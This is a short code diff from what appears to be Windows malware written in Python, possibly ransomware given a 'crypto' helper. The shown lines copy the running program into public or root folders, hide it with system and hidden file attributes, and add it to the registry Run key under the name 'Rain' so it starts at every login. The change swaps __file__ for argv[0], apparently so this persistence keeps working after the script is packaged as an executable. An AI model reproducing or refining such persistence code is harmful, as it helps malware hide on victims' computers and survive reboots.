@@ -4,6 +4,7 @@ from os import getenv, chdir, system
 from os.path import expanduser
 from string import ascii_uppercase
 from shutil import copyfile
+from sys import argv
 
 """ ABOUT VARIABLES TO BE DECLARED
 
@@ -357,16 +358,16 @@ appdata = getenv('APPDATA')
 """
 
 try:
-    dst = r'C:\Users\Public\{}'.format(__file__)
-    copyfile(__file__, dst)
+    dst = r'C:\Users\Public\{}'.format(argv[0])
+    copyfile(argv[0], dst)
     system('attrib +s +h {}'.format(dst))
 except PermissionError:
     try:
-        dst = r'C:\{}'.format(__file__)
-        copyfile(__file__, dst)
+        dst = r'C:\{}'.format(argv[0])
+        copyfile(argv[0], dst)
         system('attrib +s +h {}'.format(dst))
     except PermissionError:
-        dst = __file__
+        dst = argv[0]
         system('attrib +s +h {}'.format(dst))
 
 crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"', 'Rain')
